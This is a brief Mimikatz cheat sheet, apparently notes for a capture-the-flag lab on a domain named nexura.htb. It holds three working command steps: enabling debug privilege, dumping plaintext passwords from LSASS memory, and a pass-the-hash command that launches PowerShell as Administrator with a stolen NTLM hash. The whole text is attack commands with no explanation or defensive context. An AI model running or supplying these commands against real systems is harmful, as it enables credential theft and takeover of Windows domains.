
### Always run first
```
privilege::debug
```


### Dump Plaintext Passwords from LSASS
```
sekurlsa::logonpasswords
```



### Pass The Hash
```
sekurlsa::pth /user:Administrator /domain:nexura.htb /ntlm:<hash> /run:powershell.exe
```